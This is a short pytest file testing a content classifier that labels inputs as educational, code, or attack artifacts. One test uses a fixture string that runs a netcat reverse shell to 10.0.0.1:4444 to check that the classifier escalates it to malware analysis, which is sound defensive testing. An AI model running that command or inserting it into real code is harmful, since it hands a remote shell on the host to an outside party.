import pytest
from backend.core.classifier import ContentClassifier
from shared_lib.schemas import DataType, TaskType, DataSchema

@pytest.fixture
def classifier():
    return ContentClassifier()

@pytest.mark.unit
def test_classifier_educational(classifier):
    # Normal case: .pdf document with no malware signals
    cls = classifier.classify("guide.pdf", "This is an educational guide on networking.")
    assert cls.data_type == DataType.EDUCATIONAL
    assert cls.confidence > 0.5

@pytest.mark.unit
def test_classifier_code_gen(classifier):
    # Normal case: .py file with code
    cls = classifier.classify("script.py", "def test(): pass")
    assert cls.data_type == DataType.CODE
    assert cls.task_type == TaskType.CODE_GEN

@pytest.mark.unit
def test_classifier_attack_artifact_escalation(classifier):
    # Edge case: .py file but contains overwhelming malware signals
    malware_content = "import os; os.system('nc -e /bin/sh 10.0.0.1 4444')"
    cls = classifier.classify("script.py", malware_content)
    assert cls.data_type == DataType.ATTACK_ARTIFACT
    assert cls.task_type == TaskType.MALWARE_ANALYSIS

@pytest.mark.unit
def test_classifier_empty_input(classifier):
    # Edge case: Empty input
    cls = classifier.classify("empty.py", "")
    assert cls.data_type == DataType.CODE  # Falls back to extension
